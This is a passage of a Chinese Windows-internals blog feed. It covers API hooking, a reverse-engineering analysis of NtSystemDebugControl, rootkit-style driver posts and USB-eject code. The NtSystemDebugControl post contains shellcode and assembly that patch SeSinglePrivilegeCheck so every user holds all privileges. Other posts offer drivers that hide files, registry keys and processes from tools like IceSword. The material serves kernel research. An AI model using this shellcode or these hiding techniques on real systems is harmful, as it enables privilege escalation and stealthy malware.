href="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_05_2.jpg"&gt;&lt;img style="border-top-width: 0px; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="220" alt="crack_05" src="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_05_thumb.jpg" width="872" border="0"&gt;&lt;/a&gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; （执行SetDll.exe前）&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; (执行SetDll.exe后)&lt;br&gt;执行SetDll.exe重写后的MessageBoxApp.exe，点击确定后可以看到结果如下：&lt;br&gt;至此，MessageBoxApp.exe对MessageBoxA函数的调用已经被截获，弹出的对话框内容已经明显说明这一点。&lt;br&gt;&lt;a href="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_06_2.jpg"&gt;&lt;img style="border-top-width: 0px; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="263" alt="crack_06" src="http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/DetourAPI_D69A/crack_06_thumb.jpg" width="407" border="0"&gt;&lt;/a&gt;&lt;/p&gt;</description></item><item><title>对Native API NtSystemDebugControl的分析</title><link>https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/</link><pubDate>Sat, 29 Mar 2008 12:01:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/native-api-ntsystemdebugcontrol-analysis/</guid><description>&lt;p&gt;对Native API NtSystemDebugControl的分析&lt;br&gt;文章作者：tombkeeper[0×40]nsfocus[0×2e]com &lt;p&gt;在《获取Windows 系统的内核变量》中，我提及了在Windows NT 5.1以上的系统&lt;br&gt;中存在一个功能强大的 Native API NtSystemDebugControl，下面我们来看看它到底&lt;br&gt;有多强大。 &lt;p&gt;NtSystemDebugControl是Windows NT系列操作系统上实现的一个系统调用，在不&lt;br&gt;同系统上的调用号分别为： &lt;p&gt;Windows NT 0xba&lt;br&gt;Windows 2000 0xde&lt;br&gt;Windows XP 0xff&lt;br&gt;Windows 2003 0×108 &lt;p&gt;这是一个未文档化的 API，《Windows NT/2000 Native API Reference》中有相&lt;br&gt;关介绍。官方定义可以在一个微软的private头文件ntexapi.h中找到。该文件中还包&lt;br&gt;含很多其它内部数据结构。可能Windows NT 4的SDK中还曾经有过这个文件（至少NT4&lt;br&gt;ResourceKit的支持文档里面是这样说的），但现在似乎微软只提供给它的合作伙伴。&lt;br&gt;好在NTKernel新闻组上有一个“very kind person”共享了这个头文件，你可以从参&lt;br&gt;考资源[2]的两个链接中得到它。 &lt;p&gt;这就是ntexapi.h中的定义： &lt;p&gt;typedef enum _SYSDBG_COMMAND {&lt;br&gt;SysDbgQueryTraceInformation = 1, //KdGetTraceInformation()&lt;br&gt;SysDbgSetTracepoint = 2, //KdSetInternalBreakpoint()&lt;br&gt;SysDbgSetSpecialCall = 3, //KdSetSpecialCall()&lt;br&gt;SysDbgClearSpecialCalls = 4, //KdClearSpecialCalls()&lt;br&gt;SysDbgQuerySpecialCalls = 5, //KdQuerySpecialCalls()&lt;br&gt;SysDbgQueryModuleInformation //ntexapi.h中有，但实际上未实现&lt;br&gt;} SYSDBG_COMMAND, *PSYSDBG_COMMAND; &lt;p&gt;NTSYSAPI&lt;br&gt;NTSTATUS&lt;br&gt;NTAPI&lt;br&gt;NtSystemDebugControl (&lt;br&gt;IN SYSDBG_COMMAND Command,&lt;br&gt;IN PVOID InputBuffer,&lt;br&gt;IN ULONG InputBufferLength,&lt;br&gt;OUT PVOID OutputBuffer,&lt;br&gt;IN ULONG OutputBufferLength,&lt;br&gt;OUT PULONG ReturnLength&lt;br&gt;); &lt;p&gt;从上面可以看出，Windows NT和Windows 2000上的NtSystemDebugControl通过不&lt;br&gt;同的第一形参可调用五个内核函数，实现相关功能。 &lt;p&gt;NtSystemDebugControl在Windows NT和Windows 2000上的功能还是比较简陋的，&lt;br&gt;《Windows NT/2000 Native API Reference》一书对这些已经介绍的很详细了，本文&lt;br&gt;不再赘述。 &lt;p&gt;从Windows NT 5.1内核（Windows XP）开始，NtSystemDebugControl的功能被极&lt;br&gt;大扩增了。根据逆向工程的结果来看，在Windows XP上NtSystemDebugControl的第一&lt;br&gt;形参可接受 20个不同的功能调用，在Windows 2003上则有28个。 &lt;p&gt;关于NtSystemDebugControl在Windows NT 5.1以上的实现，互联网上唯一能找到&lt;br&gt;的资料是BUGTRAQ ID 9694关于该 API的一个漏洞报告（参考资源[1]），事实上，这&lt;br&gt;个所谓漏洞是不能称之为漏洞的，因为调用这个API需要SeDebugPrivilege 特权，普&lt;br&gt;通用户根本执行不了，也就谈不上权限提升。 &lt;p&gt;下面的enum是我逆向工程的结果，绝大部分经过测试： &lt;p&gt;typedef enum _SYSDBG_COMMAND {&lt;br&gt;//以下5个在Windows NT各个版本上都有&lt;br&gt;SysDbgGetTraceInformation = 1,&lt;br&gt;SysDbgSetInternalBreakpoint = 2,&lt;br&gt;SysDbgSetSpecialCall = 3,&lt;br&gt;SysDbgClearSpecialCalls = 4,&lt;br&gt;SysDbgQuerySpecialCalls = 5, &lt;p&gt;// 以下是NT 5.1 新增的&lt;br&gt;SysDbgDbgBreakPointWithStatus = 6, &lt;p&gt;//获取KdVersionBlock&lt;br&gt;SysDbgSysGetVersion = 7, &lt;p&gt;//从内核空间拷贝到用户空间，或者从用户空间拷贝到用户空间&lt;br&gt;//但是不能从用户空间拷贝到内核空间&lt;br&gt;SysDbgCopyMemoryChunks_0 = 8,&lt;br&gt;//SysDbgReadVirtualMemory = 8, &lt;p&gt;//从用户空间拷贝到内核空间，或者从用户空间拷贝到用户空间&lt;br&gt;//但是不能从内核空间拷贝到用户空间&lt;br&gt;SysDbgCopyMemoryChunks_1 = 9,&lt;br&gt;//SysDbgWriteVirtualMemory = 9, &lt;p&gt;//从物理地址拷贝到用户空间，不能写到内核空间&lt;br&gt;SysDbgCopyMemoryChunks_2 = 10,&lt;br&gt;//SysDbgReadVirtualMemory = 10, &lt;p&gt;//从用户空间拷贝到物理地址，不能读取内核空间&lt;br&gt;SysDbgCopyMemoryChunks_3 = 11,&lt;br&gt;//SysDbgWriteVirtualMemory = 11, &lt;p&gt;//读写处理器相关控制块&lt;br&gt;SysDbgSysReadControlSpace = 12,&lt;br&gt;SysDbgSysWriteControlSpace = 13, &lt;p&gt;//读写端口&lt;br&gt;SysDbgSysReadIoSpace = 14,&lt;br&gt;SysDbgSysWriteIoSpace = 15, &lt;p&gt;//分别调用RDMSR@4和_WRMSR@12&lt;br&gt;SysDbgSysReadMsr = 16,&lt;br&gt;SysDbgSysWriteMsr = 17, &lt;p&gt;//读写总线数据&lt;br&gt;SysDbgSysReadBusData = 18,&lt;br&gt;SysDbgSysWriteBusData = 19, &lt;p&gt;SysDbgSysCheckLowMemory = 20, &lt;p&gt;// 以下是NT 5.2 新增的 &lt;p&gt;//分别调用_KdEnableDebugger@0和_KdDisableDebugger@0&lt;br&gt;SysDbgEnableDebugger = 21,&lt;br&gt;SysDbgDisableDebugger = 22, &lt;p&gt;//获取和设置一些调试相关的变量&lt;br&gt;SysDbgGetAutoEnableOnEvent = 23,&lt;br&gt;SysDbgSetAutoEnableOnEvent = 24,&lt;br&gt;SysDbgGetPitchDebugger = 25,&lt;br&gt;SysDbgSetDbgPrintBufferSize = 26,&lt;br&gt;SysDbgGetIgnoreUmExceptions = 27,&lt;br&gt;SysDbgSetIgnoreUmExceptions = 28&lt;br&gt;} SYSDBG_COMMAND, *PSYSDBG_COMMAND; &lt;p&gt;从上面可以看出，在Windows NT 5.1以上的NtSystemDebugControl可以实现读写&lt;br&gt;内核线性空间数据、读写物理内存、读写端口、读写总线数据、读写MSR 等功能；在&lt;br&gt;Windows NT 5.2以上还可以在系统运行状态下使能、禁用内核调试以及获取、设置一&lt;br&gt;些相关变量等。 &lt;p&gt;显然，从Windows XP开始，我们再次获得了MS DOS时代直接操纵系统的权杖，戴&lt;br&gt;着桂冠，重新回到了奥林匹斯山之巅。 &lt;p&gt;下面举几个具体应用的例子。 &lt;p&gt;例子1： &lt;p&gt;下面代码演示读取KdVersionBlock： &lt;p&gt;//————————————————————————&lt;br&gt;typedef struct _DBGKD_GET_VERSION64 {&lt;br&gt;USHORT MajorVersion;&lt;br&gt;USHORT MinorVersion;&lt;br&gt;USHORT ProtocolVersion;&lt;br&gt;USHORT Flags;&lt;br&gt;USHORT MachineType;&lt;br&gt;UCHAR MaxPacketType;&lt;br&gt;UCHAR MaxStateChange;&lt;br&gt;UCHAR MaxManipulate;&lt;br&gt;UCHAR Simulation;&lt;br&gt;USHORT Unused[1];&lt;br&gt;ULONG64 KernBase;&lt;br&gt;ULONG64 PsLoadedModuleList;&lt;br&gt;ULONG64 DebuggerDataList;&lt;br&gt;} DBGKD_GET_VERSION64, *PDBGKD_GET_VERSION64; &lt;p&gt;DBGKD_GET_VERSION64 KdVersionBlock; &lt;p&gt;EnablePrivilege(SE_DEBUG_NAME); &lt;p&gt;ZwSystemDebugControl&lt;br&gt;(&lt;br&gt;SysDbgSysGetVersion,&lt;br&gt;NULL,&lt;br&gt;0,&lt;br&gt;&amp;amp;KdVersionBlock,&lt;br&gt;sizeof(KdVersionBlock), //必须是0×28&lt;br&gt;NULL&lt;br&gt;); &lt;p&gt;printf (”KernBase: 0x%.8x\n”,KdVersionBlock.KernBase);&lt;br&gt;printf (”PsLoadedModuleList: 0x%.8x\n”,KdVersionBlock.PsLoadedModuleList);&lt;br&gt;printf (”DebuggerDataList: 0x%.8x\n”,KdVersionBlock.DebuggerDataList);&lt;br&gt;//———————————————————————— &lt;p&gt;例子2： &lt;p&gt;下面代码演示读取内核空间数据的操作，这里读取的是Windows 2003内核映像的&lt;br&gt;头两个字节，也就是“MZ”。 &lt;p&gt;//————————————————————————&lt;br&gt;typedef struct _MEMORY_CHUNKS {&lt;br&gt;ULONG Address;&lt;br&gt;PVOID Data;&lt;br&gt;ULONG Length;&lt;br&gt;}MEMORY_CHUNKS, *PMEMORY_CHUNKS; &lt;p&gt;MEMORY_CHUNKS QueryBuff;&lt;br&gt;ULONG ReturnLength;&lt;br&gt;char Buff[0×2] = {0}; &lt;p&gt;QueryBuff.Address = 0×804e0000; //Windows 2003的KernBase&lt;br&gt;QueryBuff.Data = Buff; //在此是读出缓冲&lt;br&gt;QueryBuff.Length = sizeof(Buff); &lt;p&gt;EnablePrivilege(SE_DEBUG_NAME); &lt;p&gt;ZwSystemDebugControl&lt;br&gt;(&lt;br&gt;SysDbgCopyMemoryChunks_0,&lt;br&gt;&amp;amp;QueryBuff,&lt;br&gt;sizeof(MEMORY_CHUNKS), //必须是0×0C&lt;br&gt;NULL,&lt;br&gt;0,&lt;br&gt;&amp;amp;ReturnLength&lt;br&gt;); &lt;p&gt;printf (”\”MZ\”: %s\n”,Buff);&lt;br&gt;//———————————————————————— &lt;p&gt;例子3： &lt;p&gt;下面是一个使用NtSystemDebugControl的SysDbgCopyMemoryChunks_1功能实现的&lt;br&gt;Patch内核的ShellCode，把0×80580e66由原来的8a450c改为90b001： &lt;p&gt;修改前： &lt;p&gt;nt!SeSinglePrivilegeCheck+0×5c:&lt;br&gt;80580e66 8a450c mov al,[ebp+0xc]&lt;br&gt;80580e69 c9 leave&lt;br&gt;80580e6a c20c00 ret 0xc &lt;p&gt;修改后：&lt;br&gt;nt!SeSinglePrivilegeCheck+0×5c:&lt;br&gt;80580e66 90 nop&lt;br&gt;80580e67 b001 mov al,0×1&lt;br&gt;80580e69 c9 leave&lt;br&gt;80580e6a c20c00 ret 0xc &lt;p&gt;这样，SeSinglePrivilegeCheck总是返回True，也就是说，无论哪个用户，总是&lt;br&gt;拥有全部系统特权。 &lt;p&gt;\xeb\x09\x66\xb8\x08\x01\x8b\xd4\x0f\x34\xc3\x68\x90\xb0\x01\xc9&lt;br&gt;\x8b\xc4\x6a\x04\x50\x68\x66\x0e\x58\x80\x54\x5b\x33\xc0\x50\x54&lt;br&gt;\x50\x50\x6a\x0c\x53\x6a\x09\x50\xe8\xd5\xff\xff\xff\x83 &lt;p&gt;//————————————————————————&lt;br&gt;#pragma comment(linker, “/entry:main /ALIGN:4096″ )&lt;br&gt;#pragma comment(lib, “kernel32.lib”) &lt;p&gt;#define sysenter __asm __emit 0×0f __asm __emit 0×34 &lt;p&gt;void main(void)&lt;br&gt;{&lt;br&gt;__asm&lt;br&gt;{&lt;br&gt;int 3 //debug&lt;br&gt;jmp patch &lt;p&gt;SystemDebugControl: &lt;p&gt;mov ax,0×108&lt;br&gt;mov edx,esp&lt;br&gt;sysenter&lt;br&gt;ret &lt;p&gt;patch: &lt;p&gt;push 0xc901b090&lt;br&gt;mov eax,esp&lt;br&gt;push 0×04&lt;br&gt;push eax&lt;br&gt;push 0×80580e66&lt;br&gt;push esp&lt;br&gt;pop ebx&lt;br&gt;xor eax,eax&lt;br&gt;push eax&lt;br&gt;push esp //ReturnLength&lt;br&gt;push eax //OutputBufferLength&lt;br&gt;push eax //OutputBuffer&lt;br&gt;push 0×0c //InputBufferLength&lt;br&gt;push ebx //InputBuffer&lt;br&gt;push 0×09 //ControlCode&lt;br&gt;push eax //for sysenter ret&lt;br&gt;call SystemDebugControl&lt;br&gt;add esp,0×30 //只是为了修正堆栈&lt;br&gt;}&lt;br&gt;}&lt;br&gt;//———————————————————————— &lt;p&gt;上面只是一个概念代码，使用的Patch地址是固定的，对5.2.3790.0 版本的内核&lt;br&gt;有效。由于调用NtSystemDebugControl 要SeDebugPrivilege，所以这段ShellCode需&lt;br&gt;要在LocalSystem 的身份的进程空间运行，或者自己增加SeDebugPrivilege。最简单&lt;br&gt;的办法就是在WinDBG中执行。 &lt;p&gt;例子4： &lt;p&gt;下面是一段完整的代码，利用NtSystemDebugControl读写端口的能力，直接操纵&lt;br&gt;PC Speaker发声： &lt;p&gt;//————————————————————————&lt;br&gt;//演示用ZwSystemDebugControl读写端口使PC Speaker发声&lt;br&gt;//tombkeeper 2004.08.03 &lt;p&gt;#include &lt;br&gt;#include &lt;p&gt;#pragma comment(lib, “advapi32″) &lt;p&gt;#define NTAPI __stdcall&lt;br&gt;#define FCHK(a) if (!(a)) {printf(#a ” failed\n”); return 0;} &lt;p&gt;typedef int NTSTATUS; &lt;p&gt;typedef enum _SYSDBG_COMMAND&lt;br&gt;{&lt;br&gt;SysDbgSysReadIoSpace = 14,&lt;br&gt;SysDbgSysWriteIoSpace = 15&lt;br&gt;}SYSDBG_COMMAND, *PSYSDBG_COMMAND; &lt;p&gt;typedef NTSTATUS (NTAPI * PZwSystemDebugControl) (&lt;br&gt;SYSDBG_COMMAND ControlCode,&lt;br&gt;PVOID InputBuffer,&lt;br&gt;ULONG InputBufferLength,&lt;br&gt;PVOID OutputBuffer,&lt;br&gt;ULONG OutputBufferLength,&lt;br&gt;PULONG ReturnLength&lt;br&gt;); &lt;p&gt;PZwSystemDebugControl ZwSystemDebugControl = NULL; &lt;p&gt;typedef struct _IO_STRUCT&lt;br&gt;{&lt;br&gt;DWORD IoAddr; // IN: Aligned to NumBYTEs,I/O address&lt;br&gt;DWORD Reserved1; // Never accessed by the kernel&lt;br&gt;PVOID pBuffer; // IN (write) or OUT (read): Ptr to buffer&lt;br&gt;DWORD NumBYTEs; // IN: # BYTEs to read/write. Only use 1, 2, or 4.&lt;br&gt;DWORD Reserved4; // Must be 1&lt;br&gt;DWORD Reserved5; // Must be 0&lt;br&gt;DWORD Reserved6; // Must be 1&lt;br&gt;DWORD Reserved7; // Never accessed by the kernel&lt;br&gt;}&lt;br&gt;IO_STRUCT, *PIO_STRUCT; &lt;p&gt;BOOL EnablePrivilege (PCSTR name)&lt;br&gt;{&lt;br&gt;HANDLE hToken;&lt;br&gt;BOOL rv; &lt;p&gt;TOKEN_PRIVILEGES priv = { 1, {0, 0, SE_PRIVILEGE_ENABLED} };&lt;br&gt;LookupPrivilegeValue (&lt;br&gt;0,&lt;br&gt;name,&lt;br&gt;&amp;amp;priv.Privileges[0].Luid&lt;br&gt;); &lt;p&gt;OpenProcessToken(&lt;br&gt;GetCurrentProcess (),&lt;br&gt;TOKEN_ADJUST_PRIVILEGES,&lt;br&gt;&amp;amp;hToken&lt;br&gt;); &lt;p&gt;AdjustTokenPrivileges (&lt;br&gt;hToken,&lt;br&gt;FALSE,&lt;br&gt;&amp;amp;priv,&lt;br&gt;sizeof priv,&lt;br&gt;0,&lt;br&gt;0&lt;br&gt;);&lt;br&gt;rv = GetLastError () == ERROR_SUCCESS; &lt;p&gt;CloseHandle (hToken);&lt;br&gt;return rv;&lt;br&gt;} &lt;p&gt;BYTE InPortB (int Port)&lt;br&gt;{&lt;br&gt;BYTE Value;&lt;br&gt;IO_STRUCT io; &lt;p&gt;io.IoAddr = Port;&lt;br&gt;io.Reserved1 = 0;&lt;br&gt;io.pBuffer = (PVOID) (PULONG) &amp;amp; Value;&lt;br&gt;io.NumBYTEs = sizeof (BYTE);&lt;br&gt;io.Reserved4 = 1;&lt;br&gt;io.Reserved5 = 0;&lt;br&gt;io.Reserved6 = 1;&lt;br&gt;io.Reserved7 = 0; &lt;p&gt;ZwSystemDebugControl&lt;br&gt;(&lt;br&gt;SysDbgSysReadIoSpace,&lt;br&gt;&amp;amp;io,&lt;br&gt;sizeof (io),&lt;br&gt;NULL,&lt;br&gt;0,&lt;br&gt;NULL&lt;br&gt;);&lt;br&gt;return Value;&lt;br&gt;} &lt;p&gt;void OutPortB (int Port, BYTE Value)&lt;br&gt;{&lt;br&gt;IO_STRUCT io; &lt;p&gt;io.IoAddr = Port;&lt;br&gt;io.Reserved1 = 0;&lt;br&gt;io.pBuffer = (PVOID) (PULONG) &amp;amp; Value;&lt;br&gt;io.NumBYTEs = sizeof (BYTE);&lt;br&gt;io.Reserved4 = 1;&lt;br&gt;io.Reserved5 = 0;&lt;br&gt;io.Reserved6 = 1;&lt;br&gt;io.Reserved7 = 0; &lt;p&gt;ZwSystemDebugControl&lt;br&gt;(&lt;br&gt;SysDbgSysWriteIoSpace,&lt;br&gt;&amp;amp;io,&lt;br&gt;sizeof (io),&lt;br&gt;NULL,&lt;br&gt;0,&lt;br&gt;NULL&lt;br&gt;);&lt;br&gt;}; &lt;p&gt;void BeepOn (int Freq)&lt;br&gt;{&lt;br&gt;BYTE b; &lt;p&gt;if ((Freq &amp;gt;= 20) &amp;amp;&amp;amp; (Freq &amp;lt;= 20000))&lt;br&gt;{&lt;br&gt;Freq = 1193181 / Freq;&lt;br&gt;b = InPortB (0x61);&lt;br&gt;if ((b &amp;amp; 3) == 0)&lt;br&gt;{&lt;br&gt;OutPortB (0x61, (BYTE) (b | 3));&lt;br&gt;OutPortB (0x43, 0xb6);&lt;br&gt;}&lt;br&gt;OutPortB (0x42, (BYTE) Freq);&lt;br&gt;OutPortB (0x42, (BYTE) (Freq &amp;gt;&amp;gt; 8));&lt;br&gt;}&lt;br&gt;} &lt;p&gt;void BeepOff (void)&lt;br&gt;{&lt;br&gt;BYTE b; &lt;p&gt;b = (InPortB (0×61) &amp;amp; 0xfc);&lt;br&gt;OutPortB (0×61, b);&lt;br&gt;} &lt;p&gt;int main (void)&lt;br&gt;{&lt;br&gt;HMODULE hNtdll;&lt;br&gt;ULONG ReturnLength;&lt;br&gt;OSVERSIONINFO OSVersionInfo;&lt;br&gt;OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO); &lt;p&gt;EnablePrivilege (SE_DEBUG_NAME); &lt;p&gt;FCHK ((hNtdll = LoadLibrary (”ntdll.dll”)) != NULL);&lt;br&gt;FCHK ((ZwSystemDebugControl = (PZwSystemDebugControl)&lt;br&gt;GetProcAddress (hNtdll, “ZwSystemDebugControl”)) != NULL);&lt;br&gt;FCHK ((void *) GetVersionEx (&amp;amp;OSVersionInfo) != NULL); &lt;p&gt;if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT &amp;amp;&amp;amp;&lt;br&gt;OSVersionInfo.dwMajorVersion &amp;gt;= 5 &amp;amp;&amp;amp;&lt;br&gt;OSVersionInfo.dwMinorVersion &amp;gt;= 1) //Windows XP以上&lt;br&gt;{&lt;br&gt;BeepOn (1000); //声音频率1000Hz&lt;br&gt;Sleep (1000);&lt;br&gt;BeepOff ();&lt;br&gt;}&lt;br&gt;else&lt;br&gt;{&lt;br&gt;printf (”This program require Windows XP or Windows 2003.\n”);&lt;br&gt;}&lt;br&gt;return 0;&lt;br&gt;}&lt;br&gt;//———————————————————————— &lt;p&gt;参考资源： &lt;p&gt;[1]Microsoft Windows NtSystemDebugControl() Kernel API Function Privilege&lt;br&gt;Escalation Vulnerability&lt;br&gt;http://www.securityfocus.com/bid/9694 &lt;p&gt;[2]ntexapi.h&lt;br&gt;http://www.codeguru.com/code/legacy/system/ntexapi.zip&lt;br&gt;http://void.ru/files/Ntexapi.h&lt;/p&gt;</description></item><item><title>驱动级隐藏文件,注册表,进程</title><link>https://blogs.qipai360.cn/post/driver-level-hide-files-registry-processes/</link><pubDate>Sat, 29 Mar 2008 11:59:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/driver-level-hide-files-registry-processes/</guid><description>&lt;p&gt;驱动级隐藏文件,注册表,进程&lt;/p&gt; &lt;p&gt;驱动程序暂不提供源码!&lt;br&gt;提供接口方便调用.&lt;/p&gt; &lt;p&gt;别的不说了，看代码。&lt;/p&gt; &lt;p&gt;&amp;nbsp;&lt;/p&gt; &lt;p&gt;&amp;nbsp;&lt;/p&gt; &lt;p&gt;&lt;a title="点击下载" href="http://www.cnxct.com/attachments/month_200612/12_155223_1xp5tfilter.rar"&gt;点击下载&lt;/a&gt;&lt;/p&gt;</description></item><item><title>发一段隐藏注册表项的驱动代码，可以过目前最新的IceSword1.22</title><link>https://blogs.qipai360.cn/post/hidden-registry-driver-code-bypass-icesword/</link><pubDate>Sat, 29 Mar 2008 11:48:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/hidden-registry-driver-code-bypass-icesword/</guid><description>&lt;p&gt;以前驱动开发网悬赏挑战IceSword时写的，不过最后没公开。那时流氓软件势头正劲，我可不想火上浇油。现在反流氓软件日渐成熟，也就没关系了。知道了原理，防御是非常容易的。&lt;/p&gt;</description></item><item><title>从文件句柄获得全路径</title><link>https://blogs.qipai360.cn/post/getting-full-path-from-file-handle/</link><pubDate>Sat, 29 Mar 2008 11:42:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/getting-full-path-from-file-handle/</guid><description>&lt;p&gt;从文件句柄获得全路径这个问题，似乎是个“老大难”问题。&lt;br&gt;
很久以前我就在水木清华见到过。最近又不断有人提到。&lt;br&gt;
其实问题并不难，只是解决办法有点绕，不是调用一个API就能解决的。&lt;/p&gt;</description></item><item><title>弹出U盘代码</title><link>https://blogs.qipai360.cn/post/eject-usb-drive-code/</link><pubDate>Sun, 16 Mar 2008 09:39:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/eject-usb-drive-code/</guid><description>&lt;p&gt;//以下代码来自网上，需DDK、SDK支持&lt;br /&gt;&lt;/p&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;p&gt;#include &amp;lt;windows.h&amp;gt;&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;#include &amp;lt;Setupapi.h&amp;gt;&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;#include &amp;lt;winioctl.h&amp;gt;&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;#include &amp;lt;cfgmgr32.h&amp;gt;&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;#include &amp;lt;regstr.h&amp;gt;   &lt;br /&gt;&lt;/p&gt;
&lt;p&gt;#include &amp;lt;initguid.h&amp;gt;  &lt;/p&gt;
&lt;pre&gt;&lt;font color="#0000ff"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/font&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;font color="#0000ff"&gt;extern&amp;nbsp;&amp;nbsp; "C"&amp;nbsp;&amp;nbsp; &lt;br /&gt;

{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;

&amp;nbsp;#include&amp;nbsp;&amp;nbsp; "hidsdi.h"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;

}&amp;nbsp;&amp;nbsp; &lt;/font&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;font color="#0000ff"&gt;DEFINE_GUID(GUID_DEVINTERFACE_DISK,&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0x53f56307L, 0xb6bf, 0x11d0, 0x94, 0xf2, 0x00, 0xa0, 0xc9, 0x1e, 0xfb, 0x8b);&lt;br /&gt;

DEFINE_GUID(GUID_DEVINTERFACE_CDROM,&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0x53f56308L, 0xb6bf, 0x11d0, 0x94, 0xf2, 0x00, 0xa0, 0xc9, 0x1e, 0xfb, 0x8b);&lt;/font&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;font color="#0000ff"&gt;//-------------------------------------------------&lt;br /&gt;

DEVINST GetDrivesDevInstByDiskNumber(long DiskNumber, UINT DriveType);&lt;br /&gt;

//-------------------------------------------------&lt;/font&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;font color="#0000ff"&gt;//-------------------------------------------------&lt;br /&gt;

int main(int argc, char* argv[])&lt;br /&gt;

{&lt;br /&gt;

&amp;nbsp;if ( argc != 2 ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 1;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;//printf("in \n\n");&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;char DriveLetter = argv[1][0];&lt;br /&gt;

&amp;nbsp;DriveLetter &amp;amp;= ~0x20; // uppercase&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;if ( DriveLetter &amp;lt; 'A' || DriveLetter &amp;gt; 'Z' ) &lt;br /&gt;

&amp;nbsp;{&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 1;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;char szRootPath[] = "X:\\";&amp;nbsp;&amp;nbsp; // "X:\"&lt;br /&gt;

&amp;nbsp;szRootPath[0] = DriveLetter;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;char szVolumeAccessPath[] = "&lt;/font&gt;&lt;a&gt;&lt;font color="#0000ff"&gt;\\\\.\\X&lt;/font&gt;&lt;/a&gt;&lt;font color="#0000ff"&gt;:";&amp;nbsp;&amp;nbsp; // "&lt;/font&gt;&lt;a href="file://./X"&gt;&lt;font color="#0000ff"&gt;\\.\X&lt;/font&gt;&lt;/a&gt;&lt;font color="#0000ff"&gt;:"&lt;br /&gt;

&amp;nbsp;szVolumeAccessPath[4] = DriveLetter;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;long DiskNumber = -1;&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;HANDLE hVolume = CreateFile(szVolumeAccessPath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);&lt;br /&gt;

&amp;nbsp;if (hVolume == INVALID_HANDLE_VALUE) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;return 1;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

&amp;nbsp;&lt;br /&gt;

&amp;nbsp;STORAGE_DEVICE_NUMBER sdn;&lt;br /&gt;

&amp;nbsp;DWORD dwBytesReturned = 0;&lt;br /&gt;

&amp;nbsp;long res = DeviceIoControl(hVolume, IOCTL_STORAGE_GET_DEVICE_NUMBER, NULL, 0, &amp;amp;sdn, sizeof(sdn), &amp;amp;dwBytesReturned, NULL);&lt;br /&gt;

&amp;nbsp;if ( res ) {&lt;br /&gt;

&amp;nbsp;&amp;nbsp;DiskNumber = sdn.DeviceNumber;&lt;br /&gt;

&amp;nbsp;}&lt;br /&gt;

